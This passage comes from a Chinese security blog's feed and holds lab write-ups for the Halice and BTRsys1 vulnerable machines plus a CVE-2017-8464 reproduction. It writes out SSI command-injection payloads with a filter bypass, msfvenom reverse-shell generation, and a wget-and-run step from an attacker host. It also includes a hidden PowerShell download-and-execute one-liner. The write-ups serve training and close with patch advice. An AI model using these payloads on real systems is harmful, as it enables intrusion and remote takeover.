alt="在这里插入图片描述"><br>接着我们要在攻击机上用nc开一个监听，等服务器反弹的shell。</li><li>开启监听<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221144830556.png" alt="在这里插入图片描述"></li><li>解析执行图片马<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221145417106.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>获得权限<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221145753920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这里我们是user权限，并不是root，所以我们接下来对服务器进行提权。</li></ul><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><ul><li>使用sudo -l命令看一下权限</li><li>权限为ALL直接sudo su提权<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200221150436907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透——Halice</title>
      <link href="/posts/9bdda3fd.html"/>
      <url>/posts/9bdda3fd.html</url>
      
        <content type="html"><![CDATA[<h3 id="任务环境"><a href="#任务环境" class="headerlink" title="任务环境"></a>任务环境</h3><ul><li>攻击机：Kakli2019</li><li>靶机：Halice</li><li>涉及知识点：SSI注入、WAF绕过</li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>先找一下靶机的IP</p><pre class="line-numbers language-bash"><code class="language-bash">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200224090834368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>接着扫一下开放的端口以及服务版本：</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sV -O 192.168.1.118<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020022409103016.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>太难了，这是只能Web渗透呗？那就扫一下目录把</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200224091142524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>看到这个页面首先想到目录遍历，找一个上传点，反弹Shell<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200224091544784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>接着去看一下index.shtml，这里给出了提示，让我们通过SSI进行命令注入<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200224091746653.png" alt="在这里插入图片描述"></p><p>接下来找一个输入框试一下</p><pre class="line-numbers language-swift"><code class="language-swift"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>#exec cmd<span class="token operator">=</span><span class="token string">"cat /etc/passwd"</span> <span class="token operator">--</span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200224091943444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里exec被过滤了，我们尝试大小写绕过</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200224092036345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">成功绕过</p><pre class="line-numbers language-swift"><code class="language-swift"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>#<span class="token constant">EXEC</span> cmd<span class="token operator">=</span><span class="token string">"cat /etc/passwd"</span> <span class="token operator">--</span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200224092342940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>那我们就在靶机上生成一个可反弹的shell，因为这里只能执行命令，所以我们优先选择生成python脚本</p><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p python/meterpreter/reverse_tcp lhost<span class="token operator">=</span>192.168.1.106 lport<span class="token operator">=</span>4444 -f raw <span class="token operator">></span> /root/shell.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200224092956479.png" alt="在这里插入图片描述"><br>接着开启apache服务，把这个shell挂上去<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200224093101540.png" alt="在这里插入图片描述"></p><p>接下来把机上开启监听</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200224093304415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="权限获取"><a href="#权限获取" class="headerlink" title="权限获取"></a>权限获取</h3><p>回到web页面，执行下载命令：</p><pre class="line-numbers language-swift"><code class="language-swift"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>#<span class="token constant">EXEC</span> cmd<span class="token operator">=</span><span class="token string">"wget http://192.168.1.106/shell.py"</span> <span class="token operator">--</span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200224093459701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>给shell加权限</p><pre class="line-numbers language-swift"><code class="language-swift"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>#<span class="token constant">EXEC</span> cmd<span class="token operator">=</span><span class="token string">"chmod 777 shell.py"</span> <span class="token operator">--</span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020022409360581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>执行脚本，成功拿到shell</p><pre class="line-numbers language-swift"><code class="language-swift"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>#<span class="token constant">EXEC</span> cmd<span class="token operator">=</span><span class="token string">"python shell.py"</span> <span class="token operator">--</span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200224093906291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>这里没有提权成功。。。。脏牛用不了，find提权也不行，Kali里没有exp，网上关于Linux4.10内核版本的exp也都试了，一点办法都没有，后续如果提权成功了会更新这篇文章的QAQ</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机渗透——BTRsys1</title>
      <link href="/posts/9c105788.html"/>
      <url>/posts/9c105788.html</url>
      
        <content type="html"><![CDATA[<h3 id="任务环境"><a href="#任务环境" class="headerlink" title="任务环境"></a>任务环境</h3><ul><li>攻击机：Kali2019</li><li>靶机：BRTsys1</li><li>涉及知识点：代码审计、目录遍历、文件上传、脏牛提权</li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>还是老样子先进行信息收集：</p><pre class="line-numbers language-bash"><code class="language-bash">arp-scan -l <span class="token comment" spellcheck="true">#扫描内网存活主机</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020022322424561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着扫一下开放的端口与版本信息</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -sV -O 192.168.1.116<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223224412629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>开放了22、80端口，话不多说，直接扫一下Web页面</p><pre class="line-numbers language-bash"><code class="language-bash">dirb http://192.168.1.116:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223224900485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里什么都没扫到，挨个访问看一下。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223231635928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看来存在目录遍历、手动试了几个页面，终于找到了它的后台登录页面。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020022322495467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里试了试弱口令，给了一个提示<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223225033410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我？？？？<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223225124743.png" alt="在这里插入图片描述"></p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>右键查看源代码，发现了它对输入的账号进行了规则<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223225741649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入符合规则的账号后，登陆后台<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223225920732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这里看似登陆了后台，其实并没有，因为并没有什么可以交互，也就是说，只是给你了一个网页，于是只能返回去试一试万能密码了。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223230743919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">成功登陆以后我们右键看一下源代码：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020022323100090.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>这里只是对前端做出了限制，我们用Burp抓包改包成功上传shell，访问一下uploads页面<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223231518371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="权限获取"><a href="#权限获取" class="headerlink" title="权限获取"></a>权限获取</h3><p>攻击机MSF用handler开启监听</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223232400195.png" alt="在这里插入图片描述"></p><p>去Web页面执行exp</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020022323344820.png" alt="在这里插入图片描述"></p><p>成功反弹shell<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020022323341280.png" alt="在这里插入图片描述"></p><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查看内核版本<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223233636439.png" alt="在这里插入图片描述"><br>search对应的exp</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223234451222.png" alt="在这里插入图片描述"><br>直接将exp上传到靶机并编译<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223234610372.png" alt="在这里插入图片描述">成功提权<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223235110203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 提权 </tag>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>震网三代漏洞复现（CVE-2017-8464）</title>
      <link href="/posts/d3a7d8d7.html"/>
      <url>/posts/d3a7d8d7.html</url>
      
        <content type="html"><![CDATA[<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre><code>Windows 7Windows 8.1Windows RT 8.1Windows 10Windows Server 2008Windows Server 2008 R2Windows Server 2012Windows Server 2012 R2Windows Server 2016</code></pre><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>被攻击机插入存在exp的U盘后会反弹shell，哪怕是被隔离的内网，也可以在不上网的情况下被攻击。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>当Windows搜索处理内存中的对象时，存在远程代码执行漏洞，攻击者可以利用此漏洞完全控制被攻击机。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h5 id="任务环境"><a href="#任务环境" class="headerlink" title="任务环境"></a>任务环境</h5><ul><li>攻击机：Kali2019</li><li>靶机：Win7 SP1</li></ul><h5 id="创建EXP"><a href="#创建EXP" class="headerlink" title="创建EXP"></a>创建EXP</h5><ul><li>打开MSF，使用CVE_2017_8464漏洞模块<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222220927503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222221136158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>设置参数，LHOST（kali IP）、LPORT、payload</li></ul><p>LHOST=192.168.1.106<br>LPORT=4444<br>payload=windows/meterpreter/reverse_tcp</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222221600109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>创建EXP，exp存放在/root/.msf4/local/下</li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222221730444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="获取靶机权限"><a href="#获取靶机权限" class="headerlink" title="获取靶机权限"></a>获取靶机权限</h5><ul><li>开启监听</li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222222113481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>将存有EXP的U盘插入靶机，并执行cpl文件<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222222722843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>获得权限<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222222843855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h5 id="利用Powershell获取权限"><a href="#利用Powershell获取权限" class="headerlink" title="利用Powershell获取权限"></a>利用Powershell获取权限</h5></li><li>生成攻击文件exp.ps1并移动到网站根目录</li></ul><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp lhost<span class="token operator">=</span>192.168.1.106 -f  psh-reflection<span class="token operator">></span>exp.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222225514695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>开启监听<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222225755360.png" alt="在这里插入图片描述"></li><li>打开靶机，新建一个快捷键</li><li>输入构造的payload</li></ul><pre class="line-numbers language-javascript"><code class="language-javascript">powershell <span class="token operator">-</span>windowstyle hidden <span class="token operator">-</span>exec bypass <span class="token operator">-</span>c <span class="token string">"IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.1.106/exp.ps1‘);test.ps1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222230046934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>运行创建好的powershell.exe文件<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222231344612.png" alt="在这里插入图片描述"></li><li>获取权限</li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020022223450712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>更新Windows操作系统补丁禁用USB自动播放安装杀毒软件</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
